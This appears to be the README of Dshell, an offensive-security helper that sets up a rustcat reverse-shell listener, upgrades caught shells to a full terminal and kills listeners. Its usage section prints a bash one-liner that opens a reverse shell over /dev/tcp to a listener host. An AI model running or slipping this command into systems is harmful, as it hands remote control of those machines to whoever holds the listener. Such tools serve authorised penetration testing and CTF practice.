# 🤔 What is this?

![](/Video/dshell.gif)

Tired of manually upgrading your reverse shell every time? Let Dshell handle it for you!

Dshell is a tiny reverse-shell helper that spins up a responsive listener and automatically upgrade your terminal on a given port using [rustcat](https://github.com/robiot/rustcat)

<br>

# ✨ Features

* Quickly set up a reverse shell listener.
* Fully responsive TTY with $${\text{\color{red}C}\text{\color{green}O}\text{\color{blue}L}\text{\color{yellow}O}\text{\color{orange}R}\text{\color{lightblue}S}}$$ and <ins>Tab Completion</ins>
* Auto-selects the best network interface when none is provided.

# 🛠️ Installation

1. Ensure [rustcat](https://github.com/robiot/rustcat) is installed on your system.
2.
```sh
git clone https://github.com/Bimo754/Dshell
cd Dshell
chmod +x install.sh
sudo ./install.sh
```

<br>


# 📖 Usage

**Dshell** has two modes, `listen` or `kill`

## Help Menu

```sh
dshell -h
```
**Usage**
```sh
dshell -p <PORT> [IFACE|IP]
dshell -k <PORT|all>
```

## Run a Listener

```sh
dshell -p <PORT> [IFACE|IP]
```

Dshell will print the most commonly used reverse shell command (with the supplied IP and PORT), for example:

```sh
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

If you don't supply an interface or IP, Dshell will try these interfaces in order:

* `tun1`
* `tun0`
* `wlan0`
* `eth0`
* `lo`

## Kill Running Processes

```sh
dshell -k <PORT|all>
```

* `<PORT>` — Kill the Dshell process listening on the specified port.
* `all`  — Kill all running Dshell processes.

<br>

# Examples

Start a listener on port `4444` using `tun0` interface:

```sh
dshell -p 4444 tun0
```

Start a listener on port `4444` using the IP `1.1.1.1`:

```sh
dshell -p 4444 1.1.1.1
```

Kill `all` running Dshell processes:

```sh
dshell -k all
```

Kill Dshell processe that is listening on port `4444`:

```sh
dshell -k 4444
```
